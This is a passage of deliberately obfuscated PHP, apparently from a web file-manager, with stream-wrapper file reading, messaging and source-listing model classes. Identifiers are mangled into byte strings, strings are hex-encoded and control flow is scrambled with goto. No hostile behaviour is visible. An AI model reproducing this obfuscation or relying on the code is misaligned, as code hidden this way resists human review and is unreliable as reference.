< 0) { $this->pose = $this->info[$a®ˆ´èç×¤[77]] + $EÅª†õ¹¼ƒ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¹Ò‹Ò¹][77]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($C©Œ£Ø»£Ä, $Aä‹…©ï„„) { $e›†¡§¡‚± =& $_SERVER[¹Ò‹Ò¹]; $bøÙ²’ ª… = $this->info($C©Œ£Ø»£Ä); return array($e›†¡§¡‚±[1355] => 0, $e›†¡§¡‚±[1356] => 0, $e›†¡§¡‚±[12] => 32768 + 511, $e›†¡§¡‚±[1357] => 0, $e›†¡§¡‚±[1358] => 0, $e›†¡§¡‚±[1359] => 0, $e›†¡§¡‚±[1360] => 0, $e›†¡§¡‚±[77] => $bøÙ²’ ª…[$e›†¡§¡‚±[77]], $e›†¡§¡‚±[1361] => $bøÙ²’ ª…[$e›†¡§¡‚±[1230]], $e›†¡§¡‚±[1317] => $bøÙ²’ ª…[$e›†¡§¡‚±[83]], $e›†¡§¡‚±[1316] => $bøÙ²’ ª…[$e›†¡§¡‚±[192]], $e›†¡§¡‚±[1362] => 0, $e›†¡§¡‚±[1363] => 0); } static $fileInfo = array(); public function info($C„¶  ¥µÊ) { $B…†®Œİùø = $_SERVER[¹Ò‹Ò¹][1364]; if (isset(self::$fileInfo[$C„¶  ¥µÊ])) { return self::$fileInfo[$C„¶  ¥µÊ]; } if (substr($C„¶  ¥µÊ, 0, strlen($B…†®Œİùø)) != $B…†®Œİùø) { return !1; } self::$fileInfo[$C„¶  ¥µÊ] = IO::info(substr($C„¶  ¥µÊ, strlen($B…†®Œİùø))); return self::$fileInfo[$C„¶  ¥µÊ]; } public static function read($DÚñˆ×Şö‹, $ešÕ†®Ëƒ, $E¾ÀÛ‡’¤) { if (!isset(self::$_fopenCache[$DÚñˆ×Şö‹])) { $aŒšÑŒÛŠ = new StreamWrapperIO(); $aŒšÑŒÛŠ->stream_open($DÚñˆ×Şö‹); self::$_fopenCache[$DÚñˆ×Şö‹] = $aŒšÑŒÛŠ; } $aŒšÑŒÛŠ = self::$_fopenCache[$DÚñˆ×Şö‹]; return $aŒšÑŒÛŠ->fileSubstr($ešÕ†®Ëƒ, $E¾ÀÛ‡’¤); } public static function _read($DÍ¢¦–ğË×, $bÀ¯óğˆÌö, $bî‰ùÕùĞš) { goto B˜µÉ¾•Áƒ; B˜µÉ¾•Áƒ: $dƒ÷ãŸ«£ =& $_SERVER[¹Ò‹Ò¹]; $céÎ£ØÓôç = fopen($DÍ¢¦–ğË×, $dƒ÷ãŸ«£[1234]); if (!$céÎ£ØÓôç) { return $dƒ÷ãŸ«£[33]; } goto F øŠˆİŞò; F øŠˆİŞò: $bëñï‡È£  = 8192; fseek($céÎ£ØÓôç, $bÀ¯óğˆÌö, SEEK_SET); $aÖ££ö¦Ö = $dƒ÷ãŸ«£[33]; goto EºŸ¬´ëˆ; EºŸ¬´ëˆ: $CŞÁ­ºË†À = 0; while ($CŞÁ­ºË†À < $bî‰ùÕùĞš) { $C¦İèÓæ¢ = min($bëñï‡È£ , $bî‰ùÕùĞš - $CŞÁ­ºË†À); $aÖ££ö¦Ö .= fread($céÎ£ØÓôç, $C¦İèÓæ¢); $CŞÁ­ºË†À += $C¦İèÓæ¢; } fclose($céÎ£ØÓôç); goto A“¼ŠË¦ô; A“¼ŠË¦ô: return $aÖ££ö¦Ö; goto b†‘àáåÁï; b†‘àáåÁï: } public function fileSubstr($aÔŞÓç½Ø¤, $c—ÃÅ•¿—Ê) { goto aŒ©ÁÂ‘®; bŞ”íòøç“: $C‹¸í¥£ë” = 0; $CÜÃ‘¤æµ = 0; $eÁçéĞ‰İ– = $EÙË¸êÚÎÆ[33]; goto cĞŒº¹È•„; A‚õÌ¼Ñ¨ï: $e¥ÂºŒøë˜ = ceil(($aÔŞÓç½Ø¤ + $c—ÃÅ•¿—Ê) / $EƒÜŞñÅĞ) * $EƒÜŞñÅĞ - $aÎÇ¯ƒ¥¼; $b†Ğùôˆ­ = IO::fileSubstr($this->path, $aÎÇ¯ƒ¥¼, $e¥ÂºŒøë˜); $a°‰¶äÒº´[$aÎÇ¯ƒ¥¼ . $EÙË¸êÚÎÆ[33]] = $b†Ğùôˆ­; goto BÒº«¢Ã„î; cĞŒº¹È•„: foreach ($a°‰¶äÒº´ as $C‹¸í¥£ë” => $eÁçéĞ‰İ–) { $C‹¸í¥£ë” = intval($C‹¸í¥£ë”); $CÜÃ‘¤æµ = $C‹¸í¥£ë” + strlen($eÁçéĞ‰İ–); if ($aÔŞÓç½Ø¤ >= $CÜÃ‘¤æµ) { continue; } if ($aÔŞÓç½Ø¤ >= $C‹¸í¥£ë” && $aÔŞÓç½Ø¤ + $c—ÃÅ•¿—Ê <= $CÜÃ‘¤æµ) { return substr($eÁçéĞ‰İ–, $aÔŞÓç½Ø¤ - $C‹¸í¥£ë”, $c—ÃÅ•¿—Ê); } break; } if (count($a°‰¶äÒº´) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($EÙË¸êÚÎÆ[1365], $EÙË¸êÚÎÆ[1366] . count($a°‰¶äÒº´) . "\x3b\x73\x74\141\x72\x74\75{$aÔŞÓç½Ø¤}\x2c\154\x65\156\x67\164\x68\x3d{$c—ÃÅ•¿—Ê}\x3b\160\x6f\x73\145\x3a{$C‹¸í¥£ë”}\176{$CÜÃ‘¤æµ}"); throw new Exception($EÙË¸êÚÎÆ[1367]); } $aÎÇ¯ƒ¥¼ = intval($aÔŞÓç½Ø¤ / $EƒÜŞñÅĞ) * $EƒÜŞñÅĞ; goto A‚õÌ¼Ñ¨ï; aÍèÏ²ËÕÎ: $EƒÜŞñÅĞ = 64 * 1024; $a°‰¶äÒº´ =& self::$_chunkBuffer[$this->path]; if (!$a°‰¶äÒº´) { $a°‰¶äÒº´ = array(); } goto bŞ”íòøç“; BÒº«¢Ã„î: ksort($a°‰¶äÒº´); $FÙßÑÏóØÛ = substr($b†Ğùôˆ­, $aÔŞÓç½Ø¤ - $aÎÇ¯ƒ¥¼, $c—ÃÅ•¿—Ê); return $FÙßÑÏóØÛ; goto f•ÔÊ—éâ; c¨÷õ¾§Ôë: if ($aÔŞÓç½Ø¤ + $c—ÃÅ•¿—Ê > $Fî«†±ßñ) { $c—ÃÅ•¿—Ê = $Fî«†±ßñ - $aÔŞÓç½Ø¤; } if ($c—ÃÅ•¿—Ê <= 0) { return $EÙË¸êÚÎÆ[33]; } if ($aÔŞÓç½Ø¤ < 0 || $aÔŞÓç½Ø¤ >= $Fî«†±ßñ || $c—ÃÅ•¿—Ê <= 0 || $c—ÃÅ•¿—Ê > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\x46\151\x6c\145\x52\x65\141\144\x20\145\x72\x72\x6f\x72\x21\x20\163\164\141\162\x74\75{$aÔŞÓç½Ø¤}\x3b\x6c\x65\x6e\x67\164\x68\75{$c—ÃÅ•¿—Ê}\73\40\x73\151\x7a\145\x3d{$Fî«†±ßñ}\x3b"); } goto aÍèÏ²ËÕÎ; aŒ©ÁÂ‘®: $EÙË¸êÚÎÆ =& $_SERVER[¹Ò‹Ò¹]; $Fî«†±ßñ = $this->info[$EÙË¸êÚÎÆ[77]]; $cøóİ£±ŒÈ = $aÔŞÓç½Ø¤; goto dÈì°³áË¤; dÈì°³áË¤: $eŒœåËÅ„ = $c—ÃÅ•¿—Ê; if ($aÔŞÓç½Ø¤ < 0) { $aÔŞÓç½Ø¤ = $Fî«†±ßñ + $aÔŞÓç½Ø¤; } if ($c—ÃÅ•¿—Ê === !1) { $c—ÃÅ•¿—Ê = $Fî«†±ßñ - $aÔŞÓç½Ø¤; } goto c¨÷õ¾§Ôë; f•ÔÊ—éâ: } private function log($AšèÎĞŞ‹°, $FÅ´êè¢éñ) { $eÕÅà¢ÑĞ§ =& $_SERVER[¹Ò‹Ò¹]; $B–¤Íß“‘Ü = timeFloat() - $this->timeStart; write_log(sprintf($eÕÅà¢ÑĞ§[1368], $AšèÎĞŞ‹°, $this->info[$eÕÅà¢ÑĞ§[28]], $B–¤Íß“‘Ü, $FÅ´êè¢éñ), $eÕÅà¢ÑĞ§[1053]); } } class Message { function __construct() { } public function send($aó•Üğâ‘ = '', $CŠÊÉÑĞÏä = array(), $A°—ø‘ºéÆ = "\164\145\x78\164") { goto dÓ¯°ÄÔíÌ; a¾ÓÄÁŸ…¥: Hook::trigger($CÎÛãÎ¼İ[1372], $Bí‰Ì‰´•¿); goto bÙùìŒ²¹ˆ; Fç‚…†›©: $CŠÊÉÑĞÏä = array($CÎÛãÎ¼İ[991] => isset($CŠÊÉÑĞÏä[$CÎÛãÎ¼İ[991]]) ? $CŠÊÉÑĞÏä[$CÎÛãÎ¼İ[991]] : $CÎÛãÎ¼İ[33], $CÎÛãÎ¼İ[557] => isset($CŠÊÉÑĞÏä[$CÎÛãÎ¼İ[557]]) ? $CŠÊÉÑĞÏä[$CÎÛãÎ¼İ[557]] : $CÎÛãÎ¼İ[33]); if (empty($aó•Üğâ‘) || empty($CŠÊÉÑĞÏä[$CÎÛãÎ¼İ[991]]) && empty($CŠÊÉÑĞÏä[$CÎÛãÎ¼İ[557]])) { return !1; } $Bí‰Ì‰´•¿ = array($CÎÛãÎ¼İ[1310] => $D ÔóŠá”, $CÎÛãÎ¼İ[1371] => $CŠÊÉÑĞÏä); goto a¾ÓÄÁŸ…¥; dÓ¯°ÄÔíÌ: $CÎÛãÎ¼İ =& $_SERVER[¹Ò‹Ò¹]; $D ÔóŠá” = array($CÎÛãÎ¼İ[29] => $CÎÛãÎ¼İ[1369], $CÎÛãÎ¼İ[707] => $aó•Üğâ‘); if (in_array($A°—ø‘ºéÆ, array($CÎÛãÎ¼İ[1369], $CÎÛãÎ¼İ[1370]))) { $D ÔóŠá”[$CÎÛãÎ¼İ[29]] = $A°—ø‘ºéÆ; } goto Fç‚…†›©; bÙùìŒ²¹ˆ: } } goto D¶İß¶ÏÜÌ; c´¹®âë‘’: class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\157\x75\162\x63\x65"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\x6d\145" => "\151\157\x5f\163\x6f\165\x72\143\145\137\155\x65\x74\x61", "\x6d\x65\164\x61\x46\x69\145\x6c\x64" => "\163\x6f\x75\162\x63\145\x49\104"); protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\171\124\151\155\145", "\164\x69\155\145", "\x69\156\163\145\162\x74", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\x63\x72\x65\x61\x74\x65\x54\x69\x6d\145", "\x74\151\155\x65", "\151\156\x73\x65\162\x74", "\146\165\156\143\x74\x69\x6f\x6e"), array("\166\151\x65\x77\124\151\x6d\x65", "\164\151\155\x65", "\x69\156\x73\145\x72\x74", "\x66\165\x6e\143\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($DÒ½Ùöœ) { return $this->listSource(array($_SERVER[¹Ò‹Ò¹][389] => $DÒ½Ùöœ)); } public function typeName($bÔÍÈ²Ê») { static $dš´‘ªçÖ˜ = array(self::TYPE_SYSTEM => "\163\x79\x73\164\x65\x6d", self::TYPE_USER => "\x75\163\x65\162", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $dš´‘ªçÖ˜[$bÔÍÈ²Ê» . $_SERVER[¹Ò‹Ò¹][33]]; } public function sourceListInfo($CĞ»ƒ¯ƒã, $A‘ó¬Œ††¶ = false) { goto B…ª½òá¦Î; A‘­˜ó”î—: return array_to_keyvalue($c‹‰„£ñ‡¾, $bêŞùÊ§â¾[390]); goto aì¯‹¶Ì¯ñ; B…ª½òá¦Î: $bêŞùÊ§â¾ =& $_SERVER[¹Ò‹Ò¹]; $CĞ»ƒ¯ƒã = $CĞ»ƒ¯ƒã ? $CĞ»ƒ¯ƒã : array(); $CĞ»ƒ¯ƒã = array_filter(array_unique($CĞ»ƒ¯ƒã)); goto Añ¥Å©÷Ğ; Añ¥Å©÷Ğ: if (!$CĞ»ƒ¯ƒã) { return array(); } $c‹‰„£ñ‡¾ = $this->where(array($bêŞùÊ§â¾[390] => array($bêŞùÊ§â¾[7], $CĞ»ƒ¯ƒã)))->select(); $this->_listDataApply($c‹‰„£ñ‡¾, $A‘ó¬Œ††¶); goto A‘­˜ó”î—; aì¯‹¶Ì¯ñ: } public function pathInfoFilter(&$dÍ–ÑÕ¼¨ô) { goto cÊÉŠÈÖ¿Ù; d…“¨¦ÕíŠ: if (isset($dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[400]]) && $dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[400]][$D¸·ÎËÛ´[401]] == -1) { $fóè¢Ï¢¶ = $EÅœóğõì; } $dÍ–ÑÕ¼¨ô = array_field_key($dÍ–ÑÕ¼¨ô, $fóè¢Ï¢¶); return $dÍ–ÑÕ¼¨ô; goto fÖŒäã¶ê; dùò Ç¸Ø‚: $dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[398]] = $this->typeName($dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[398]]); if ($dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[397]] != 1) { $dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[167]] = $dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[399]]; unset($dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[399]]); } $fóè¢Ï¢¶ = $cÃíÑÊ‹; goto d…“¨¦ÕíŠ; A÷‚“„ÛŠŒ: if (!$cÃíÑÊ‹) { goto b„†ªŠ³ƒ; b„†ªŠ³ƒ: $aà‚ÈÜêøò = $D¸·ÎËÛ´[391]; $aà‚ÈÜêøò .= $D¸·ÎËÛ´[392]; $aà‚ÈÜêøò .= $D¸·ÎËÛ´[393]; goto c¿šÏåö; c¿šÏåö: $bÄù°Éæ† = $D¸·ÎËÛ´[394]; $d¯è´ßÔñ = explode($D¸·ÎËÛ´[47], $bÄù°Éæ†); $cÃíÑÊ‹ = explode($D¸·ÎËÛ´[47], $aà‚ÈÜêøò); goto eÕ„Áƒ£‡; eÕ„Áƒ£‡: $EÅœóğõì = array(); foreach ($cÃíÑÊ‹ as $Aî¦™ñ…) { if (in_array($Aî¦™ñ…, $d¯è´ßÔñ)) { continue; } $EÅœóğõì[] = $Aî¦™ñ…; } goto B®‡µ’ù®©; B®‡µ’ù®©: } $dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[75]] = $D¸·ÎËÛ´[395] . $dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[390]] . $D¸·ÎËÛ´[396]; $dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[29]] = $dÍ–ÑÕ¼¨ô[$D¸·ÎËÛ´[397]] == 1 ? $D¸·ÎËÛ´[76] : $D¸·ÎËÛ´[191]; goto dùò Ç¸Ø‚; cÊÉŠÈÖ¿Ù: $D¸·ÎËÛ´ =& $_SERVER[¹Ò‹Ò¹]; static $cÃíÑÊ‹ = false; static $EÅœóğõì = false; goto A÷‚“„ÛŠŒ; fÖŒäã¶ê: } public function listUserFav() { goto fÜ¢°ŞáØò; fÜ¢°ŞáØò: $cŸ ç·Å‡¾ =& $_SERVER[¹Ò‹Ò¹]; $dÖö–Í´ôö = Model($cŸ ç·Å‡¾[402])->listData(); $f©¨´±éíé = array_filter_by_field($dÖö–Í´ôö, $cŸ ç·Å‡¾[29], $cŸ ç·Å‡¾[403]); goto F„Õñ†·¾Õ; F„Õñ†·¾Õ: $f©¨´±éíé = array_to_keyvalue($f©¨´±éíé, $cŸ ç·Å‡¾[33], $cŸ ç·Å‡¾[75]); if ($f©¨´±éíé) { $BÆÙÙƒì¯ = $this->listSource(array($cŸ ç·Å‡¾[404] => array($cŸ ç·Å‡¾[405], $f©¨´±éíé))); } $BÆÙÙƒì¯ = array_to_keyvalue($BÆÙÙƒì¯[$cŸ ç·Å‡¾[365]], $cŸ ç·Å‡¾[390]); goto eØÇÁô©Ô; eØÇÁô©Ô: foreach ($dÖö–Í´ôö as &$CÉ¤š’Û‚±) { $CÉ¤š’Û‚± = array($cŸ ç·Å‡¾[406] => $CÉ¤š’Û‚±[$cŸ ç·Å‡¾[388]], $cŸ ç·Å‡¾[407] => $CÉ¤š’Û‚±[$cŸ ç·Å‡¾[28]], $cŸ ç·Å‡¾[408] => $CÉ¤š’Û‚±[$cŸ ç·Å‡¾[75]], $cŸ ç·Å‡¾[409] => $CÉ¤š’Û‚±[$cŸ ç·Å‡¾[29]], $cŸ ç·Å‡¾[410] => $CÉ¤š’Û‚±[$cŸ ç·Å‡¾[192]], $cŸ ç·Å‡¾[411] => $CÉ¤š’Û‚±[$cŸ ç·Å‡¾[83]]); if ($CÉ¤š’Û‚±[$cŸ ç·Å‡¾[29]] == $cŸ ç·Å‡¾[403] && $BÆÙÙƒì¯[$CÉ¤š’Û‚±[$cŸ ç·Å‡¾[75]]]) { $CÉ¤š’Û‚±[$cŸ ç·Å‡¾[84]] = $BÆÙÙƒì¯[$CÉ¤š’Û‚±[$cŸ ç·Å‡¾[75]]]; } } unset($CÉ¤š’Û‚±); return $dÖö–Í´ôö; goto E¤…Ô¼™‘¾; E¤…Ô¼™‘¾: } public function listUserTag($cØ‰¿è…†”) { goto bâ™øÓ´·š; Bá§ñ‘Ñã: foreach ($E•ˆí“à’ as $E°õŠßô—§ => $eƒ·ˆÙò‡) { $eº¬ÏÍ×‚ = !0; if (!$cØ‰¿è…†”) { $cŠ°ÕÌé¹[] = $E°õŠßô—§; continue; } foreach ($cØ‰¿è…†” as $e„‡è¾Ø¯†) { if (!in_array($e„‡è¾Ø¯†, $eƒ·ˆÙò‡)) { $eº¬ÏÍ×‚ = !1; break; } } if ($eº¬ÏÍ×‚) { $cŠ°ÕÌé¹[] = $E°õŠßô—§; } } if (!$cŠ°ÕÌé¹) { return array(); } $bÕÀ¸“¶Ü = $this->listSource(array($dÜÏ»Á¦¬±[404] => array($dÜÏ»Á¦¬±[405], $cŠ°ÕÌé¹))); goto aì³’‘”îÎ; aì³’‘”îÎ: if (!$bÕÀ¸“¶Ü || count($cŠ°ÕÌé¹) == $bÕÀ¸“¶Ü[$dÜÏ»Á¦¬±[362]][$dÜÏ»Á¦¬±[363]]) { return $bÕÀ¸“¶Ü; } $aÙÁÒ…ô…Ô = array(); $a“¦¨Â–Ú = array_to_keyvalue($bÕÀ¸“¶Ü[$dÜÏ»Á¦¬±[74]], $dÜÏ»Á¦¬±[33], $dÜÏ»Á¦¬±[390]); goto a‚ğ—ˆçœ; bëÄ°ãºÚ: if ($aÙÁÒ…ô…Ô) { Model($dÜÏ»Á¦¬±[414])->removeBySource($aÙÁÒ…ô…Ô); } return $bÕÀ¸“¶Ü; goto F–…ŞÎØÛô; bâ™øÓ´·š: $dÜÏ»Á¦¬± =& $_SERVER[¹Ò‹Ò¹]; if ($cØ‰¿è…†” && !is_array($cØ‰¿è…†”)) { $cØ‰¿è…†” = array($cØ‰¿è…†”); } $BÍˆÍ¿¿Ù­ = Model($dÜÏ»Á¦¬±[412])->listData(); goto aİñ¹¬¿´; aİñ¹¬¿´: $E•ˆí“à’ = array(); foreach ($BÍˆÍ¿¿Ù­ as $a‹‘¦ÑÎ¼·) { $B‚½•²„ = $a‹‘¦ÑÎ¼·[$dÜÏ»Á¦¬±[75]]; if (!$B‚½•²„) { continue; } if (!isset($E•ˆí“à’[$B‚½•²„])) { $E•ˆí“à’[$B‚½•²„] = array(); } $E•ˆí“à’[$B‚½•²„][] = $a‹‘¦ÑÎ¼·[$dÜÏ»Á¦¬±[413]]; } $cŠ°ÕÌé¹ = array(); goto Bá§ñ‘Ñã; a‚ğ—ˆçœ: $e¦ÓÒó¡Ë¼ = array_to_keyvalue($bÕÀ¸“¶Ü[$dÜÏ»Á¦¬±[73]], $dÜÏ»Á¦¬±[33], $dÜÏ»Á¦¬±[390]); $aÙÕÅÉ°‡È = array_merge($e¦ÓÒó¡Ë¼, $a“¦¨Â–Ú); foreach ($cŠ°ÕÌé¹ as $B‚½•²„) { if (!in_array($B‚½•²„, $aÙÕÅÉ°‡È)) { $aÙÁÒ…ô…Ô[] = $B‚½•²„; } } goto bëÄ°ãºÚ; F–…ŞÎØÛô: } public function listUserRecycle() { $CæìŒ¦ÎÛâ =& $_SERVER[¹Ò‹Ò¹]; $eİÈºÀ‡¯ = Model($CæìŒ¦ÎÛâ[415])->listData(); if (!$eİÈºÀ‡¯) { return array(); } $cÑ¨‹¶”÷š = array($CæìŒ¦ÎÛâ[404] => array($CæìŒ¦ÎÛâ[405], $eİÈºÀ‡¯), $CæìŒ¦ÎÛâ[416] => 1); return $this->listSource($cÑ¨‹¶”÷š); } public function listSource($E¶µŞÇ¬ªÁ, $cùêÛ•œ¿ô = 3000) { goto F×¼°â‚§Š; BÍÈÓºÖ: $b…»êî¹Ñ = $this->field($Dã‚¤¯î†š)->_makeOrder()->where($E¶µŞÇ¬ªÁ)->selectPage($cùêÛ•œ¿ô); $this->_listDataApply($b…»êî¹Ñ[$E³‘µÕœ ò[365]]); $this->_listMake($b…»êî¹Ñ); goto c†ÂÓèè¬Æ; F×¼°â‚§Š: $E³‘µÕœ ò =& $_SERVER[¹Ò‹Ò¹]; if (!isset($E¶µŞÇ¬ªÁ[$E³‘µÕœ ò[417]])) { $E¶µŞÇ¬ªÁ[$E³‘µÕœ ò[417]] = 0; } $Dã‚¤¯î†š = $E³‘µÕœ ò[418]; goto BÍÈÓºÖ; c†ÂÓèè¬Æ: return $b…»êî¹Ñ; goto fÉóÉ¥˜¸; fÉóÉ¥˜¸: } protected function _makeOrder() { goto A´ƒìòÛõ©; A´ƒìòÛõ©: $dˆÀ„×½· =& $_SERVER[¹Ò‹Ò¹]; $eÚâñÎèÒ” = Model($dˆÀ„×½·[419])->get($dˆÀ„×½·[420]); $c¡¬·›‡… = Model($dˆÀ„×½·[419])->get($dˆÀ„×½·[421]); goto C¬„÷íœˆ; F…áƒˆØˆ: $Féãİõ‘áÄ = Input::get($dˆÀ„×½·[430], $dˆÀ„×½·[7], $c¡¬·›‡…, array_keys($e«²ˆ¶—†¯)); if (!in_array($D£ğ‰¸Ÿ×ñ, array_keys($EÑñ“ù‡Ïõ))) { $D£ğ‰¸Ÿ×ñ = $dˆÀ„×½·[28]; } if (!in_array($Féãİõ‘áÄ, array_keys($e«²ˆ¶—†¯))) { $D£ğ‰¸Ÿ×ñ = $dˆÀ„×½·[422]; } goto A‚ƒãÇ‚ÁÆ; C¬„÷íœˆ: $e«²ˆ¶—†¯ = array($dˆÀ„×½·[422] => $dˆÀ„×½·[423], $dˆÀ„×½·[424] => $dˆÀ„×½·[425]); $EÑñ“ù‡Ïõ = array($dˆÀ„×½·[28] => $dˆÀ„×½·[28], $dˆÀ„×½·[77] => $dˆÀ„×½·[77], $dˆÀ„×½·[167] => $dˆÀ„×½·[399], $dˆÀ„×½·[426] => $dˆÀ„×½·[426], $dˆÀ„×½·[427] => $dˆÀ„×½·[428], $dˆÀ„×½·[192] => $dˆÀ„×½·[192], $dˆÀ„×½·[83] => $dˆÀ„×½·[83]); $D£ğ‰¸Ÿ×ñ = Input::get($dˆÀ„×½·[429], $dˆÀ„×½·[7], $eÚâñÎèÒ”, array_keys($EÑñ“ù‡Ïõ)); goto F…áƒˆØˆ; A‚ƒãÇ‚ÁÆ: if ($D£ğ‰¸Ÿ×ñ == $dˆÀ„×½·[28]) { } $Fº…ëéˆëÊ = $dˆÀ„×½·[431] . $EÑñ“ù‡Ïõ[$D£ğ‰¸Ÿ×ñ] . $dˆÀ„×½·[50] . $e«²ˆ¶—†¯[$Féãİõ‘áÄ]; return $this->order(rtrim(trim($Fº…ëéˆëÊ), $dˆÀ„×½·[47])); goto CğÁÒ´££; CğÁÒ´££: } protected function _listDataApplyItem($E ÇçÄñ±÷, $b Óéêß = false) { $BÔ”©Õì¤ = array($E ÇçÄñ±÷); $this->_listDataApply($BÔ”©Õì¤, $b Óéêß); return $BÔ”©Õì¤[0]; } protected function _listDataApply(&$Dƒà«”±µ¬, $Eòïù¸†©á = false) { goto e¡¡ó‰ëˆ‹; A¨’–ó‹î: $CÓºåÙ÷¦· = array_unique($CÓºåÙ÷¦·); $this->_listSourceCache($Dƒà«”±µ¬); if (!$Eòïù¸†©á) { $this->_listAppendMeta($Dƒà«”±µ¬, $CÓºåÙ÷¦·); $this->_listAppendFileMeta($Dƒà«”±µ¬, $CÓºåÙ÷¦·); $this->_listAppendChildren($Dƒà«”±µ¬, $CÓºåÙ÷¦·); } goto C¸Â”ò‚‰ó; eÊÂã›ÁøË: $this->_listAppendUser($Dƒà«”±µ¬); $this->_listFilterInfo($Dƒà«”±µ¬, $Eòïù¸†©á); goto e³ ìÄ†á»; e¡¡ó‰ëˆ‹: $bòùÁŞªà =& $_SERVER[¹Ò‹Ò¹]; if (!$Dƒà«”±µ¬) { $Dƒà«”±µ¬ = array(); return; } $CÓºåÙ÷¦· = array_to_keyvalue($Dƒà«”±µ¬, $bòùÁŞªà[33], $bòùÁŞªà[390]); goto A¨’–ó‹î; C¸Â”ò‚‰ó: $this->_listAppendPath($Dƒà«”±µ¬); $this->_listAppendAuth($Dƒà«”±µ¬); $this->_listAppendSourceInfo($Dƒà«”±µ¬, $CÓºåÙ÷¦·); goto eÊÂã›ÁøË; e³ ìÄ†á»: } protected function _listSourceCache($FÃù¤¦µ‘) { $f¨ •éî©· =& $_SERVER[¹Ò‹Ò¹]; foreach ($FÃù¤¦µ‘ as $E¼À‡Ôó•) { self::$cacheSourceInfo[$f¨ •éî©·[432] . $E¼À‡Ôó•[$f¨ •éî©·[390]]] = $E¼À‡Ôó•; } } protected function _listFilterInfo(&$C‚Ü†Öèºº, $A‘àµ÷Œ•½ = false) { $C§œÃƒÉëé =& $_SERVER[¹Ò‹Ò¹]; foreach ($C‚Ü†Öèºº as &$d·™÷èÌõĞ) { $d·™÷èÌõĞ = $this->pathInfoFilter($d·™÷èÌõĞ); self::$cachePathInfo[$C§œÃƒÉëé[433] . intval($A‘àµ÷Œ•½) . $C§œÃƒÉëé[434] . $d·™÷èÌõĞ[$C§œÃƒÉëé[390]]] = $d·™÷èÌõĞ; } unset($d·™÷èÌõĞ); } protected function _listMake(&$B„ÉõÊ·»¹) { $f±–âÓáÁ =& $_SERVER[¹Ò‹Ò¹]; $B„ÉõÊ·»¹[$f±–âÓáÁ[74]] = array(); $B„ÉõÊ·»¹[$f±–âÓáÁ[73]] = array(); foreach ($B„ÉõÊ·»¹[$f±–âÓáÁ[365]] as $d­í×·×Äœ) { $a‡¯“•”³ƒ = $d­í×·×Äœ[$f±–âÓáÁ[397]] == 1 ? $f±–âÓáÁ[74] : $f±–âÓáÁ[73]; $B„ÉõÊ·»¹[$a‡¯“•”³ƒ][] = $d­í×·×Äœ; } unset($B„ÉõÊ·»¹[$f±–âÓáÁ[365]]); } protected function _listAppendMeta(&$A„××ÈĞ”, $C×Ûè‘†¿) { goto AíØêÓƒÁ; BÑÉÀåç“: foreach ($e¬„ˆŸ›‚ as $E¶åí»³à¼) { if (!isset($BŒ÷ÁĞ»„Œ[$E¶åí»³à¼[$CÓÁë¹Ô°ï[390]]])) { $BŒ÷ÁĞ»„Œ[$E¶åí»³à¼[$CÓÁë¹Ô°ï[390]]] = array(); } if (in_array($E¶åí»³à¼[$CÓÁë¹Ô°ï[92]], $cËÎùÆ¡Üô)) { continue; } $BŒ÷ÁĞ»„Œ[$E¶åí»³à¼[$CÓÁë¹Ô°ï[390]]][$E¶åí»³à¼[$CÓÁë¹Ô°ï[92]]] = $E¶åí»³à¼[$CÓÁë¹Ô°ï[370]]; } foreach ($A„××ÈĞ” as &$C»ê„Ÿ´—) { $C»ê„Ÿ´—[$CÓÁë¹Ô°ï[439]] = !1; if (isset($BŒ÷ÁĞ»„Œ[$C»ê„Ÿ´—[$CÓÁë¹Ô°ï[390]]])) { $C»ê„Ÿ´—[$CÓÁë¹Ô°ï[439]] = $BŒ÷ÁĞ»„Œ[$C»ê„Ÿ´—[$CÓÁë¹Ô°ï[390]]]; } if ($this->fileIsLock($C»ê„Ÿ´—) && $C»ê„Ÿ´—[$CÓÁë¹Ô°ï[400]]) { $DÅÓß•ë = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $C»ê„Ÿ´—[$CÓÁë¹Ô°ï[400]][$CÓÁë¹Ô°ï[401]] = AuthModel::authDisable($C»ê„Ÿ´—[$CÓÁë¹Ô°ï[400]][$CÓÁë¹Ô°ï[401]], $DÅÓß•ë); $C»ê„Ÿ´—[$CÓÁë¹Ô°ï[400]][$CÓÁë¹Ô°ï[440]][$CÓÁë¹Ô°ï[400]] = $C»ê„Ÿ´—[$CÓÁë¹Ô°ï[400]][$CÓÁë¹Ô°ï[401]]; } } unset($C»ê„Ÿ´—); goto c¹¦™Í´Ü; AíØêÓƒÁ: $CÓÁë¹Ô°ï =& $_SERVER[¹Ò‹Ò¹]; $CŠ¬‘…Ú¯Ì = array($CÓÁë¹Ô°ï[404] => array($CÓÁë¹Ô°ï[405], $C×Ûè‘†¿)); $e¬„ˆŸ›‚ = Model($CÓÁë¹Ô°ï[435])->field($CÓÁë¹Ô°ï[436])->where($CŠ¬‘…Ú¯Ì)->select(); goto bÒ™Ñî²äç; bÒ™Ñî²äç: if (!$e¬„ˆŸ›‚) { return; } $cËÎùÆ¡Üô = array($CÓÁë¹Ô°ï[437], $CÓÁë¹Ô°ï[438]); $BŒ÷ÁĞ»„Œ = array(); goto BÑÉÀåç“; 